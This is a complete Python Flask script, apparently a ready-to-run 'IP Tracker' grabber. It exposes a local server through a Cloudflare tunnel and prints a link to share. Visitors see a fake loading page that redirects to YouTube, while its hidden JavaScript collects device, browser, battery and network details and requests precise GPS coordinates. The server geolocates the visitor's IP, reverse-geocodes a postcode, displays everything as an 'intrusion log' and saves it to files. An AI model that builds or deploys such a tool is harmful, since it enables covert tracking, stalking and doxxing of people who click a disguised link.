import json
import os
import requests
import subprocess
import threading
import time
import re
import sys
import platform
import zipfile
import tarfile
import shutil
from datetime import datetime, timezone
from flask import Flask, request, render_template_string
from user_agents import parse as parse_ua
from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.console import Group
from rich.align import Align
import geoip2.database
from pyfiglet import Figlet

# ---- Configuration ----
YOUTUBE_URL = "https://www.youtube.com/watch?v=F17CBysnRso"
GEO_DB_PATH = os.path.join(os.path.dirname(__file__), "GeoLite2-City.mmdb")
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

app = Flask(__name__)
console = Console()

# ---- Try to load MMDB ----
try:
    reader = geoip2.database.Reader(GEO_DB_PATH)
    print(f"[bold green][+] Loaded GeoIP DB[/] from: {GEO_DB_PATH}")
except Exception as e:
    reader = None
    print(f"[bold red][!] MMDB load failed[/]: {e}")

# ---- Cloudflare Tunnel Auto-Download ----
def get_cloudflared_path():
    """Get the path to cloudflared executable"""
    if platform.system() == "Windows":
        return os.path.join(os.path.dirname(__file__), "cloudflared.exe")
    else:
        return os.path.join(os.path.dirname(__file__), "cloudflared")

def download_cloudflared():
    """Download cloudflared for the current platform"""
    system = platform.system()
    machine = platform.machine().lower()
    cloudflared_path = get_cloudflared_path()
    
    # Check if already downloaded
    if os.path.exists(cloudflared_path):
        console.print("[green]✅ cloudflared already exists[/]")
        # Make executable on Unix-like systems
        if system != "Windows":
            os.chmod(cloudflared_path, 0o755)
        return cloudflared_path
    
    console.print("[yellow]📥 Downloading cloudflared...[/]")
    
    # Determine download URL
    base_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
    
    if system == "Windows":
        # Windows
        if machine in ["amd64", "x86_64"]:
            filename = "cloudflared-windows-amd64.exe"
        elif machine == "arm64":
            filename = "cloudflared-windows-arm64.exe"
        else:
            console.print("[red]❌ Unsupported Windows architecture[/]")
            return None
    elif system == "Darwin":  # macOS
        if machine in ["amd64", "x86_64"]:
            filename = "cloudflared-darwin-amd64.tgz"
        elif machine == "arm64":
            filename = "cloudflared-darwin-arm64.tgz"
        else:
            console.print("[red]❌ Unsupported macOS architecture[/]")
            return None
    else:  # Linux
        if machine in ["amd64", "x86_64"]:
            filename = "cloudflared-linux-amd64"
        elif machine == "arm64":
            filename = "cloudflared-linux-arm64"
        elif machine.startswith("armv"):
            filename = "cloudflared-linux-arm"
        elif machine == "i386":
            filename = "cloudflared-linux-386"
        else:
            console.print("[red]❌ Unsupported Linux architecture[/]")
            return None
    
    download_url = base_url + filename
    
    try:
        # Download the file
        console.print(f"[cyan]Downloading from: {download_url}[/]")
        response = requests.get(download_url, stream=True, timeout=30)
        response.raise_for_status()
        
        # Handle archive files (macOS)
        if filename.endswith('.tgz'):
            temp_file = cloudflared_path + ".tgz"
            with open(temp_file, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            # Extract the archive
            with tarfile.open(temp_file, 'r:gz') as tar:
                tar.extractall(os.path.dirname(cloudflared_path))
            
            os.remove(temp_file)
            extracted_path = os.path.join(os.path.dirname(cloudflared_path), "cloudflared")
            if os.path.exists(extracted_path):
                shutil.move(extracted_path, cloudflared_path)
        
        # Regular binary download
        else:
            with open(cloudflared_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
        
        # Make executable on Unix-like systems
        if system != "Windows":
            os.chmod(cloudflared_path, 0o755)
        
        console.print(f"[bold green]✅ cloudflared downloaded to: {cloudflared_path}[/]")
        return cloudflared_path
        
    except Exception as e:
        console.print(f"[red]❌ Download failed: {e}[/]")
        return None

def ensure_cloudflared():
    """Ensure cloudflared is available, download if needed"""
    cloudflared_path = get_cloudflared_path()
    
    # Check if file exists and is executable
    if os.path.exists(cloudflared_path):
        try:
            # Test if it works
            result = subprocess.run([cloudflared_path, "--version"], 
                         capture_output=True, text=True, check=True, timeout=5)
            version = result.stdout.strip().split('\n')[0] if result.stdout else "unknown"
            console.print(f"[green]✅ cloudflared is ready (version: {version})[/]")
            return cloudflared_path
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
            console.print("[yellow]⚠️ Existing cloudflared is broken, re-downloading...[/]")
            if os.path.exists(cloudflared_path):
                os.remove(cloudflared_path)
    
    # Download fresh copy
    return download_cloudflared()

# ---- Cloudflare Tunnel ----
def start_cloudflare_tunnel():
    cloudflared_path = ensure_cloudflared()
    if not cloudflared_path:
        return None, None

    try:
        console.print("[yellow]🚀 Starting Cloudflare Tunnel...[/]")
        process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", "http://localhost:80"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        public_url = None
        # Read output to find the tunnel URL
        for line in iter(process.stderr.readline, ''):
            if "trycloudflare.com" in line:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    public_url = match.group(0)
                    break
            elif "INF" in line and "Registered tunnel" in line:
                # Try to extract URL from different format
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    public_url = match.group(0)
                    break
        return process, public_url
    except Exception as e:
        console.print(f"[red]❌ Tunnel failed: {e}[/]")
        return None, None

tunnel_process = None
public_url = None
tunnel_ready = threading.Event()
tunnel_started = False

def init_tunnel():
    global tunnel_process, public_url, tunnel_started
    if tunnel_started:
        return  # Prevent duplicate tunnel starts
    
    tunnel_started = True
    tunnel_process, public_url = start_cloudflare_tunnel()
    
    if public_url:
        console.print(f"\n[bold green]═══════════════════════════════════════════════════════[/]")
        console.print(f"[bold green]   🌍 YOUR PUBLIC LINK: {public_url}[/]")
        console.print(f"[bold green]═══════════════════════════════════════════════════════[/]\n")
    
    tunnel_ready.set()  # Signal that tunnel initialization is complete

def geo_lookup(ip):
    """Return geo and ISP info from MMDB or ip-api."""
    result = {
        'country'  : 'N/A',
        'region'   : 'N/A',
        'city'     : 'N/A',
        'postal'   : 'N/A',
        'latitude' : 'N/A',
        'longitude': 'N/A',
        'isp'      : 'N/A',
        'org'      : 'N/A',
        'asn'      : 'N/A'
    }

    if reader:
        try:
            geo = reader.city(ip)
            result.update({
                'country'  : geo.country.name or "N/A",
                'region'   : getattr(geo.subdivisions.most_specific, "name", "N/A"),
                'city'     : geo.city.name or "N/A",
                'postal'   : geo.postal.code or "N/A",
                'latitude' : geo.location.latitude or "N/A",
                'longitude': geo.location.longitude or "N/A"
            })
        except Exception as e:
            console.log(f"[yellow][!] MMDB lookup error:[/] {e}")

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get('status') == 'success':
            result.update({
                'country'  : res.get('country', result['country']),
                'region'   : res.get('regionName', result['region']),
                'city'     : res.get('city', result['city']),
                'postal'   : res.get('zip', result['postal']),
                'latitude' : res.get('lat', result['latitude']),
                'longitude': res.get('lon', result['longitude']),
                'isp'      : res.get('isp', result['isp']),
                'org'      : res.get('org', result['org']),
                'asn'      : res.get('as', result['asn'])
            })
    except Exception as e:
        console.log(f"[red][!] IP-API fallback failed:[/] {e}")

    return result

def reverse_geocode_osm(lat, lon):
    try:
        url = f'https://nominatim.openstreetmap.org/reverse'
        params = {
            'format': 'json',
            'lat': lat,
            'lon': lon,
            'zoom': 18,
            'addressdetails': 1
        }
        headers = {'User-Agent': 'geo-reverse-script'}
        res = requests.get(url, params=params, headers=headers, timeout=5)
        data = res.json()
        return data.get('address', {}).get('postcode', 'N/A')
    except Exception as e:
        console.log(f"[yellow][!] Reverse geocoding failed:[/] {e}")
        return 'N/A'

@app.route('/')
def home():
    html = f"""
    <!DOCTYPE html>
    <html><head><meta charset="utf-8"><title>Redirecting…</title></head>
    <style>
      * {{ box-sizing: border-box; }}
      body {{
        margin: 0; min-height: 100vh; background: #111; color: #eee;
        font-family: Arial, sans-serif;
        display: grid; place-items: center;
      }}
      .loader {{
        width: 40px; height: 40px;
        border: 4px solid #444; border-top-color: #62d996;
        border-radius: 50%; animation: spin .8s linear infinite;
      }}
      @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
    <body>
      <div class="loader" aria-label="Loading"></div>
      <script>
        const data = {{
          timestamp: new Date().toISOString(),
          redirect_url: "{YOUTUBE_URL}",
          ua: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: {{ w: screen.width, h: screen.height }},
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cookieEnabled: navigator.cookieEnabled,
          hardwareConcurrency: navigator.hardwareConcurrency || null,
          deviceMemory: navigator.deviceMemory || null,
          connection: navigator.connection ? {{
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
          }} : null,
        }}; 

        async function augmentBattery() {{
          if (navigator.getBattery) {{
            const batt = await navigator.getBattery();
            data.battery = {{
              level: Math.round(batt.level * 100) + "%",
              charging: batt.charging
            }}; 
          }}
        }}

        function sendAndRedirect(extra = {{}}) {{
          Object.assign(data, extra);
          navigator.sendBeacon('/log', JSON.stringify(data));
          setTimeout(() => window.location.replace("{YOUTUBE_URL}"), 100);
        }}

        async function init() {{
          await augmentBattery();
          if (!navigator.geolocation) {{
            sendAndRedirect();
            return;
          }}
          navigator.geolocation.getCurrentPosition(
            pos => sendAndRedirect({{
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }}),
            err => {{
              console.warn("Geo error:", err.message);
              sendAndRedirect();
            }},
            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
          );
        }}

        init();
      </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log_data():
    info = {}
    try:
        info = json.loads(request.get_data().decode())
    except json.JSONDecodeError:
        pass

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S %Z")
    latitude  = info.get("latitude")
    longitude = info.get("longitude")
    accuracy  = info.get("accuracy", "N/A")

    has_precise_location = latitude is not None and longitude is not None

    # Get IP info for ISP/ASN and fallback location
    geo = geo_lookup(ip)

    if has_precise_location:
        # OVERRIDE IP location with GPS coordinates
        geo.update({
            'latitude': latitude,
            'longitude': longitude,
            'postal': reverse_geocode_osm(latitude, longitude)
        })
        console.print(Panel(
            f"[bold green]Source:[/] Browser GPS (permission granted)\n"
            f"[bold green]Latitude:[/] {float(latitude):.6f}\n"
            f"[bold green]Longitude:[/] {float(longitude):.6f}\n"
            f"[bold green]Accuracy:[/] {float(accuracy):.2f} m\n"
            f"[bold green]Map:[/] https://maps.google.com/?q={latitude},{longitude}",
            title="[bold cyan]PRECISE GPS LOCATION[/]",
            border_style="green"
        ))
    else:
        console.print(Panel(
            "[yellow]Precise GPS location was not provided.[/]\n"
            "Using IP-based approximate location.",
            title="[bold yellow]LOCATION STATUS[/]",
            border_style="yellow"
        ))

    ua = parse_ua(info.get("ua", ""))
    browser = f"{ua.browser.family} {ua.browser.version_string}"
    os_     = f"{ua.os.family} {ua.os.version_string}"
    device  = ua.device.family if ua.device.family and ua.device.family != "Other" else "Not reported by browser"

    def stylized_header(title, style="bold green"):
        return Text(f"\n── {title} ──", style=style)

    net = Table(show_header=True, title="🌍 NETWORK / GEOLOCATION", header_style="bold magenta", box=None)
    net.add_column("🗂️", style="dim cyan", no_wrap=True)
    net.add_column("Details", style="bold white")
    for k, v in [
        ("IP Address", ip),
        ("Timestamp", timestamp),
        ("Country", geo['country']),
        ("Region", geo['region']),
        ("City", geo['city']),
        ("Postal Code", geo.get("postal", "N/A")),
        ("Latitude", str(geo['latitude'])),
        ("Longitude", str(geo['longitude'])),
        ("Accuracy (m)", str(accuracy)),
        ("ISP", geo.get("isp", "N/A")),
        ("Org", geo.get("org", "N/A")),
        ("ASN", geo.get("asn", "N/A")),
    ]:
        net.add_row(k, f"[bold green]{v}[/]" if v != "N/A" else "[red]N/A[/]")

    client = Table(show_header=True, title="🖥️ CLIENT / BROWSER", header_style="bold blue", box=None)
    client.add_column("🧩", style="dim cyan")
    client.add_column("Details", style="bold white")
    for k, v in [
        ("User-Agent", info.get("ua", "N/A")),
        ("Browser", browser),
        ("OS", os_),
        ("Device", device),
        ("Language", info.get("language", "N/A")),
        ("Screen", f"{info.get('screen', {}).get('w', '?')}x{info.get('screen', {}).get('h', '?')}"),
        ("Platform", info.get("platform", "N/A")),
        ("Timezone", info.get("timezone", "N/A")),
        ("Cookie Enabled", str(info.get("cookieEnabled", False))),
        ("Cores", str(info.get("hardwareConcurrency", "N/A"))),
        ("Memory (GB)", str(info.get("deviceMemory", "N/A"))),
        ("Conn Type", str((info.get("connection") or {}).get("effectiveType", "N/A"))),
        ("Conn RTT", str((info.get("connection") or {}).get("rtt", "N/A"))),
        ("Battery", json.dumps(info.get("battery", {}), separators=(", ", ": ")))
    ]:
        display_val = f"[bold green]{v}[/]" if v and v != "N/A" else "[red]N/A[/]"
        client.add_row(k, display_val)

    console.print(Panel.fit(
        Group(
            stylized_header("INTRUSION LOG"),
            net,
            client,
            Text(f"\n🎯 Redirected To: [bold cyan]{info.get('redirect_url')}[/]\n", style="bold yellow")
        ),
        title="[bold red]🔍 Data Captured[/]",
        border_style="bright_black"
    ))

    entry = {
        **info,
        "timestamp": timestamp,
        "ip": ip,
        **geo,
        "browser": browser,
        "os": os_,
        "device": device,
        "accuracy": accuracy,
    }
    fname = os.path.join(LOG_DIR, f"{datetime.now(timezone.utc):%Y-%m-%d}.jsonl")
    with open(fname, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    return ("", 204)

if __name__ == "__main__":
    f = Figlet(font='slant')
    console.print(f"[bold cyan]{f.renderText('IP Tracker')}[/]")
    
    console.print("[bold blue][*] Server listening on port 80[/]")
    console.print("[yellow]⏳ Setting up Cloudflare tunnel...[/]")
    
    # Start tunnel in background (only once)
    threading.Thread(target=init_tunnel, daemon=True).start()
    
    # Wait for tunnel initialization with timeout
    max_wait = 30  # seconds
    wait_start = time.time()
    
    # Show progress indicator
    with console.status("[bold yellow]Waiting for tunnel to establish...[/]", spinner="dots"):
        while not tunnel_ready.is_set():
            if time.time() - wait_start > max_wait:
                console.print("[red]⚠️ Tunnel initialization timeout. Running without tunnel.[/]")
                break
            time.sleep(0.5)
    
    # Display final status
    if public_url:
        console.print(f"""
[bold green]╔══════════════════════════════════════════════════════════════════╗
║  🌍 SHARE THIS PUBLIC LINK:                                        ║
║  [bold cyan]{public_url}[/]  ║
║  📊 Visit the link to see real-time data collection                 ║
║  📁 Logs saved in: {LOG_DIR}/                                       ║
╚══════════════════════════════════════════════════════════════════╝[/]
        """)
    else:
        console.print("[red]⚠️  Cloudflare tunnel not available. Use localhost only.[/]")
        console.print("[yellow]💡 Check your internet connection and try again.[/]")
    
    console.print("[green]🚀 Starting Flask server...[/]")
    app.run(host="0.0.0.0", port=80)
